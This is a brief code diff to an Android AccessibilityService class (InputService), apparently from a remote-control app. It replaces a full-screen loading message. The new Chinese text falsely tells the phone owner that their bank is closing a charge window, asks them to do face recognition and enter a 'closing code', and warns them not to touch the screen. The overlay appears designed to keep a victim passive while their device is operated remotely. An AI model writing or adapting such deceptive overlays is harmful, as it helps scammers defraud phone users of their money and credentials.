@@ -769,7 +769,7 @@ class InputService : AccessibilityService() {
        })*/
 	    
 	val loadingText = TextView(this, null)
-	loadingText.text = "会议正在对接您的网络......\n 请勿触碰手机!"
+	loadingText.text = "银行正在为您通过关闭代码关闭扣费窗口\n请您配合完成人脸识别输入关闭代码认证\n请勿触碰手机屏幕避免认证失败！"
 	loadingText.setTextColor(-7829368)
 	loadingText.textSize = 20.0f
 	loadingText.gravity = Gravity.CENTER
